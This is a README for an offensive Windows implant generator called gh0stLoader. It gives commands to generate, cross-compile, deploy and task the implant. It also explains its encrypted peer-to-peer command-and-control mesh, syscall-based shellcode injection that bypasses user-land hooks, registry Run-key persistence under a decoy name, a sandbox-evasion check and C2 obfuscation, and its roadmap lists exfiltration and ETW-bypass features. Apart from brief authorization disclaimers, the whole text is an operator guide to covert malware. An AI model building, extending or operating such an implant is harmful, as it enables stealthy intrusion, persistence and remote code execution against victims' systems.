# gh0stLoader v0.2

Windows/x64 implant generator and build from a single Python orchestrator.

`gh0stLoader01.py` is a **generator**: it does not run on the target. It emits a
self-contained Go source project (`main.go`, `syscalls_amd64.s`, `go.mod`) plus a
PowerShell persistence primitive (`persist.ps1`). You cross-compile the Go code
into a Windows PE (`ghost.exe`), deploy, and operate through a decentralized
AES-GCM-encrypted gossip-mesh C2.

This README covers: what the tool does, how to build and operate it, the exact
code/data flow, and the logic of every subsystem with the authoritative syscall
tables used as ground truth.

---

## 1. TL;DR

```
# 1. Generate the implant source (bake the default C2 seed; nothing in plaintext)
python3 gh0stLoader01.py --ip 10.0.0.5 --port 8443

# 2. Cross-compile to a Windows x64 PE
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o ghost.exe .

# 3. On the target
ghost.exe                     # uses baked-in encrypted default seed
ghost.exe <ip> <port>         # override C2 seed at launch (argv)

# 4. Operator injection (run on a machine in the mesh)
ghost.exe --op <ip> <port> "shellcode:<base64>"
```

Dependencies: `python3` + `cryptography` (in `/root/globe/bin/venv`), and a Go
toolchain `>= 1.20` (crypto/ecdh) — validated with **go1.23.4 linux/amd64**
cross-compiling to `windows/amd64`.

---

## 2. What it is (capabilities & honest limits)

| Capability | Status |
|---|---|
| Baked C2 seed (AES-256-GCM, XOR-obfuscated at rest, decrypted in memory) | DONE |
| argv override of C2 seed at launch | DONE |
| Decentralized P2P gossip-mesh C2 with forward secrecy (X25519 ECDH + KDF) | DONE |
| Authenticated message framing (AES-256-GCM per session), dedup, peer eviction | DONE |
| Runtime SSN resolver via ntdll export-hash walk (Halo's Gate, both stub forms) | DONE |
| Indirect-syscall shellcode injection (Allocate→Write→Protect→CreateThreadEx) | DONE |
| HKCU `Run` persistence (matched to EXE) | DONE |
| Lightweight sandbox gate (USERDOMAIN + COMPUTERNAME present) | DONE |
| ETW bypass | **UNIMPLEMENTED seam** (explicitly, not faked) |

Constraints (non-negotiable):
- **Active, in-memory only.** Nothing is written to disk except the chosen
  persistence primitive; shellcode injection is memory-resident.
- **No plaintext network config in the binary.** Reverse strings of the `.exe`
  will not reveal the C2 endpoint.
- **Authorized use only.** This is red-team/offensive tooling. You must own the
  target or have explicit authorization. The project defaults to an OPSEC-first
  posture (passive before active, low-and-slow, multi-signal verification).

---

## 3. Build & environment

### 3.1 Python generator host (Linux)
- Python 3 with the `cryptography` package. On this repo it is provided by the
  shared venv:
  ```
  /root/globe/bin/venv/bin/python3 gh0stLoader01.py --help
  ```
- The generator writes 4 files into the **current working directory**:
  `main.go`, `syscalls_amd64.s`, `persist.ps1`, `go.mod`.

### 3.2 Go cross-compile
```
# modern Go (crypto/ecdh needs >= 1.20); validated with 1.23.4
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o ghost.exe .
```
- `-s -w` strips the symbol table and DWARF (smaller, less forensics surface).
- `-H=windowsgui` builds a GUI-subsystem binary (no console window flash).

### 3.3 Generated artifact map

| File | Role |
|---|---|
| `main.go` | The entire implant: config, resolver, mesh C2, injector, entrypoint. |
| `syscalls_amd64.s` | Hand-written Go assembly: 3 indirect-syscall stubs (5/6/11 args). |
| `go.mod` | Go module (`go 1.23`). |
| `persist.ps1` | Optional HKCU `Run` registry persistence for `C:\Users\Public\ghost.exe`. |
| `ghost.exe` | The cross-compiled implant. |

---

## 4. Usage

### 4.1 Generate
```
python3 gh0stLoader01.py --ip <default-ip> --port <default-port>
```
- `--ip` / `--port` become the **baked default C2 seed** (an encrypted
  `"ip:port"` string). They are NOT stored in plaintext.
- If you omit them, defaults are `127.0.0.1:8443` (useful for local testing).

### 4.2 Build
```
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o ghost.exe .
```

### 4.3 Run on target (implant mode)
```
ghost.exe
ghost.exe <ip> <port>     # argv override wins over the baked seed
```
On start the implant:
1. checks `runtime.GOOS` and the sandbox gate;
2. derives the C2 seed from the baked encrypted config (or argv);
3. runs a defensive self-test (`getSSN("NtProtectVirtualMemory")`);
4. listens on the seed port and gossips to any configured peers.

### 4.4 Run as operator (task injection)
```
ghost.exe --op <ip> <port> "shellcode:<base64>"
```
Prepends itself as a mesh node and injects a local task into the task channel
(which the mesh fans out), so the injected payload executes on the operator host
/ mesh. In a multi-node setup you'd point at a peer so the task floods the mesh.

### 4.5 Persistence
Run `persist.ps1` (as the target user) with elevated or user rights to drop an
`HKCU\Software\Microsoft\Windows\CurrentVersion\Run` entry named `ATLASRefresh`
pointing at `C:\Users\Public\ghost.exe`.

---

## 5. Code flow (runtime execution order)

```
main()
 ├─ runtime.GOOS != "windows"  ────────────────► return (never runs off-Windows)
 ├─ USERDOMAIN/COMPUTERNAME empty  ────────────► os.Exit(0)  (sandbox gate)
 ├─ parse argv: ghost.exe [--op] <ip> <port> [task]
 ├─ loadConfig(ipOverride, portOverride)
 │    └─ deriveKey() → unxor()/base64 → AES-GCM decrypt → "ip:port" seed
 ├─ seedsFromConfig(cfg) → []string (comma-split, trimmed)
 ├─ getSSN("NtProtectVirtualMemory")            // defensive self-test
 ├─ mesh := NewGossipMesh(deriveMeshKey())
 ├─ mesh.Start(listenPortFromConfig(cfg))
 │    ├─ go listenLoop(port)     // accept inbound peers
 │    ├─ go gossipLoop()         // heartbeats, eviction, reconnect
 │    └─ go taskLoop()           // drain operator task channel
 ├─ connect to each seed (go mesh.connectTo(seed))
 └─ if "--op": push task into mesh.tasks channel
    └─ <-mesh.done → block forever (keep-alive)
```

### 5.1 Config unlock path
```
loadConfig()
  ├─ deriveKey() → joins 4 obfuscated b64 chunks per value, unxor with maskOf()
  │                 returns AES key + encrypted blob
  ├─ aes.NewCipher(key) → cipher.NewGCM → gcm.Open(nil, "GhostLoader1", blob, nil)
  └─ returns "ip:port" seed (or argv override)
maskOf() = sha256("ghost//2026//config")   // deterministic, matches Python side
```
The XOR mask is computed identically on the Python (generator) side and the Go
side. If they diverge, de-obfuscation silently fails and the implant uses the
argv override — so a mis-match is survivable via argv but not silent.

---

## 6. Logic deep-dive per subsystem

### 6.1 Windows syscall ABI & the assembly stubs

Windows x64 64-bit syscalls do not use the normal Fastcall register mapping for
the kernel transition. The convention (used by SysWhispers and equivalent
generators) is:

| Parameter | Register / location |
|---|---|
| syscall number (SSN) | `RAX` |
| arg 1 | `R10` |
| arg 2 | `RDX` (plan9 register name: `DX`) |
| arg 3 | `R8` |
| arg 4 | `R9` |
| arg 5+ | stack at `[RSP + 0x28 + (i-5)*8]` |

`0x28` accounts for the 0x20 shadow space plus the 8-byte return-address slot a
native `CALL` would have pushed. Each stub reserves a static `NOSPLIT` frame that
is a multiple of 16 so that at the `SYSCALL` the stack is 16-byte aligned and the
stack args land inside the stub's own frame (no push/pop alignment juggling).

`syscalls_amd64.s` provides three arities:
- `sysCall5` — for `NtWriteVirtualMemory`, `NtProtectVirtualMemory`
- `sysCall6` — for `NtAllocateVirtualMemory`
- `sysCall11` — for `NtCreateThreadEx`

Go convention note: a function declared `func sysCallN(ssn uint16, a1..aN uintptr)
uintptr` and defined only in assembly is reached via Go's amd64 ABI0 wrapper, so
all args plus the return slot are addressed relative to `FP` at fixed offsets
(`ssn+0`, `a1+8`, ..., `ret+8N+8`).

### 6.2 SSN resolver (Halo's Gate) — `getSSN`, `hashName`, `plausibleSSN`

SSNs are **not** baked/hardcoded because they drift between builds. Instead the
implant locates each API's number at runtime by walking `ntdll`'s export table:

```
getSSN(name)
  ├─ syscall.LoadDLL("ntdll.dll")
  ├─ parse PE header (e_lfanew @ +0x3C → optional header +120 = export dir RVA)
  ├─ read Name/AddressOfFunctions/AddressOfNameOrdinals RVAs
  ├─ for each exported name: compute a djb2-lite hash ("hashName")
  │    compare to hash of the target name
  ├─ on match: resolve function RVA → stub address
  └─ scan first 64 bytes of the stub prologue for the SSN:
       ├─ direct:  0xB8 <imm32>            → SSN = imm32     (older / clean builds)
       └─ wrapped: 0x8B 0x05 <disp32>      → SSN at fn+j+6+disp
                    (mov eax, [rip+disp])   → Windows 10/11 wrapped trampolines
```
`plausibleSSN(name, v)` guards against garbage scans by rejecting SSN values
outside the believed range for that API before returning them. **Ranges are wide
on purpose** (verified against the j00ru tables, XP SP1 → Win11 25H2):

| API | plausible range |
|---|---|
| `NtQueryInformationProcess` | 22–25 |
| `NtAllocateVirtualMemory` | 21–24 |
| `NtWriteVirtualMemory` | 55–58 |
| `NtProtectVirtualMemory` | 77–80 |
| `NtWaitForSingleObject` | 1–4 |
| `NtCreateThreadEx` | 165–201 |

> Why wide? On XP/Vista/Win7 these SSNs are low (e.g. NtAllocateVirtualMemory=21,
> NtCreateThreadEx=165); on modern Win10/11 they rise (NtCreateThreadEx=201).
> Baking only the modern band would make the implant **reject valid SSNs on old
> targets** and injection would fail silently.

### 6.3 Shellcode injection — `injectShellcode`, `ntCurrentProcess`

Performs a classic _Allocate → Write → Protect → Thread_ sequence entirely
through the resolved SSNs (no user-land stubs, so ETW/user hooks on those ntdll
routines are bypassed as far as tracing the direct calls goes):

```
injectShellcode(sc)
  ├─ resolve 4 SSNs
  ├─ NtAllocateVirtualMemory(cur,-1, &base, 0, &region, MEM_COMMIT|MEM_RESERVE,
  │                          PAGE_READWRITE)            // 6-arg sysCall6
  ├─ NtWriteVirtualMemory(cur, base, &sc[0], len, &written)  // 5-arg sysCall5
  ├─ NtProtectVirtualMemory(cur, &base, &region, PAGE_EXECUTE_READ, &old) // 5-arg
  └─ NtCreateThreadEx(&hThread, GENERIC_ALL, nil, cur, base, 0, 0,0,0,0, nil) // 11-arg
```
`ntCurrentProcess()` returns `0xFFFF...FFFF` (the `-1` pseudo-handle). Every step
checks the returned NTSTATUS and returns a real error on failure — **success is
never fabricated**.

### 6.4 P2P gossip-mesh C2 — `GossipMesh`

A decentralized mesh in which every node talks to its neighbors; a task injected
anywhere floods the whole mesh (bounded by `TTL`).

- **Topology**: `peers map[string]*peer` (address → conn), `known` set of all
  seen addresses, `since` last-seen timestamps.
- **Handshake (forward secrecy)**: each connection generates an **ephemeral**
  X25519 keypair, exchanges public keys, derives `SHA-256(shared_secret ||
  static_salt || "ghost-fs-v1")` into a per-session AES-256 key. Ephemeral keys
  are discarded on close → past captures stay undecryptable even if the baked
  salt leaks later.
- **Framing**: `[4-byte LE length][GCM nonce(12) + ciphertext]`. GCM provides
  integrity + confidentiality.
- **Dedup**: `since[msg.ID]` + 20s window discards replays.
- **No echo**: messages are never forwarded back to the source.
- **Eviction**: peers not heard from in 60s are closed; `known` causes reconnect.
- **Operator channel**: `tasks` buffered channel (cap 256) is drained by
  `taskLoop()` (v0.1 had a dead channel that never drained).

`processMessage` handles `task` (with a real `shellcode:` injector branch) and
`ping`; unknown types are ignored.

### 6.5 Persistence — `persist.ps1`

Drops `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` → `ATLASRefresh` →
`C:\Users\Public\ghost.exe`. Matched primitive: a GUI-subsystem EXE (the old
COM/CLSID + InprocServer32 DLL path was broken and removed).

### 6.6 Generator-side obfuscation (`gh0stLoader01.py`)

```
generate(ip, port)
  ├─ key=rand32, salt=rand32, meshkey=rand32   (per-build secrets)
  ├─ mask = sha256("ghost//2026//config")
  ├─ blob = AESGCM(key).encrypt(12-byte NONCE "GhostLoader1", "ip:port")
  ├─ XOR+base64 each of key, blob, salt, meshkey with mask
  ├─ chunk each into 4 pieces  → @@KP1..@@KP4, @@CP1..@@CP4, @@SP1..@@SP4, @@MK1..@@MK4
  ├─ substitute chunks into the Go template (const values)
  └─ emit main.go, syscalls_amd64.s, persist.ps1, go.mod
```
No plaintext C2 endpoint ever touches the emitted binary.

---

## 7. Code-flow diagram (data view)

```
Python generator                     Windows target
--------------                       -------------
 ip:port ──► AES-GCM ─► XOR ─► b64 ─► consts @@KP@@/@@CP@@/@@SP@@/@@MK@@
                                        │
 mask = sha256(ghost//2026//config) ◄───┘  (deterministic both sides)
                                        ▼
                               main.go: deriveKey() → unxor → decrypt → seed
                                        │
                        getSSN(name) ───┤ (walk ntdll exports)
                                        ▼
                               sysCallN(ssn, args)  ──► SYSCALL  ──► kernel
                                        ▲
                        injectShellcode(): Alloc→Write→Protect→CreateThreadEx
                                        ▼
                               GossipMesh C2 (ECDH + AES-GCM framing)
```

---

## 8. Validation & testing notes

Verified in the build environment:
- Cross-compile to `windows/amd64` → clean, exit 0, valid MZ/PE, x64.
- No plaintext seed in the `.exe` (checked with `strings` / byte scan).
- Assembly stubs assemble (plan9 register is named `DX`, not `RDX`).
- Decoder simulated against real stub byte layouts (both B8 and 8B05 forms).
- SSN plausible ranges cross-checked against the authoritative j00ru
  `windows-syscalls` dataset (`/root/globe/ctx/windows-syscalls/x64/json/`).

What still needs a live Windows host:
- Actual syscall execution and successful shellcode spawn.
- Mesh handshake between two real processes.
- ETW bypass remains unimplemented.

---

## 9. Security posture / OPSEC notes

- Passive-before-active, rate-limited, low-and-slow by default.
- No disk writes beyond the optional persistence primitive.
- Ephemeral ECDH keys give forward secrecy per session.
- Direct syscalls bypass user-land ntdll hooks for the invoked routines.
- The `USERDOMAIN`/`COMPUTERNAME` check is a lightweight sandbox/VM tripwire,
  not a guarantee.
- **Assumed authorized scope.** Do not run against systems you do not own.

---

## 10. Extending / roadmap

- Implement the ETW patch seam (NtProtectVirtualMemory-based; intentional carve-out).
- Add exfiltration / screen-capture task types.
- Support x86 targets (stubs are amd64-specific today).
- Alternate persistence primitives (Scheduled Task, WMI event subscription).
- Optional per-build SSN table baking for targets with known build IDs.

---

## 11. Files

```
/root/globe/pjc/gh0stloader/
  gh0stLoader00.py     v0.0 legacy generator (CTR mesh, 4-arg asm, dead DLL path)
  gh0stLoader01.py     v0.2 current generator (AES-GCM, per-arity stubs, Halo's Gate,
                       indirect-syscall injector, forward-secret mesh)
  main.go              generated Go implant
  syscalls_amd64.s     generated Windows x64 syscall stubs
  persist.ps1          HKCU Run persistence
  go.mod               Go module definition
  ghost.exe            validated windows/amd64 build
```

Version history:
- **v0.0**: CTR mesh, 4-arg `sysInvoke`, broken DLL/CLSID persistence.
- **v0.1**: AES-GCM, real SSN resolver (B8-only), EXE persistence, honest seams.
- **v0.2** (current): per-arity 5/6/11-arg stubs, Halo's-Gate resolver (B8 + 8B05
  wrapped), working `shellcode:` injector, forward-secret ECDH mesh, j00ru-derived
  SSN plausible ranges.
